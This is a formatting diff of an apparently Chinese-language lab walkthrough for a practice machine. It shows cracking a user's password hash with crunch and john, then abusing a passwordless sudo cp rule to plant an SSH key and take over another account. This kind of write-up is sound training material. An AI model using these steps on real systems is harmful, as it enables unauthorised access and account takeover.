@@ -7555,19 +7555,19 @@
 <p>看一下，那些文件是 www-data 可以读的</p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589162986833-97fd747a-e204-4ae3-8b5c-af75c7132581-965528.png" /></p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589163056380-eaaa1567-5556-4c73-bc95-8680840219af-696252.png" /></p>
-<p>得到 douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1 保存为 hash.txt
-同时提到是 10 位数的密码，所以 crunch 10 10 aefhrt &gt; dict.txt
+<p>得到 douglas:$apr1$9fgG/hiM$BtsL9qpNHUlylaLxk81qY1 保存为 hash.txt<br />
+同时提到是 10 位数的密码，所以 crunch 10 10 aefhrt &gt; dict.txt<br />
 john 爆破一下 john --wordlist=dict.txt hash.txt</p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589164167540-399ab0a2-59ed-45cd-8705-541cb37ea502-419982.png" /></p>
 <p>douglas:fatherrrrr    ssh 登录一下</p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589164240960-b17cc393-3dc8-4fe1-bfa3-63093e84470c-852687.png" /></p>
 <p>sudo -l 看一下，发现可以不用密码来执行 jen 用户的 cp</p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589164323611-28f5b71c-116f-4a9a-9de4-92591d84c8a2-394794.png" /></p>
-<p>ssh-keygen -t rsa
-cp /home/douglas/.ssh/hack.pub /tmp/authorized_keys
+<p>ssh-keygen -t rsa<br />
+cp /home/douglas/.ssh/hack.pub /tmp/authorized_keys<br />
 sudo -u jen /bin/cp /tmp/authorized_keys /home/jen/.ssh/</p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589165167431-aa8cccb3-d55b-4b9b-b306-bb1b2e7c4e2d-508945.png" /></p>
-<p>使用刚才生成的密钥登录
+<p>使用刚才生成的密钥登录<br />
 ssh jen@192.168.149.169 -i /home/douglas/.ssh/hack</p>
 <p><img alt="image.png" src="../img/cvvTqCAula3fKELF/1589165359728-358eaca2-7e64-40dc-964f-e64d23e3827a-077120.png" /></p>
 <p>看一下右键，他告诉我们Moss's password is now Fire!Fire!</p>
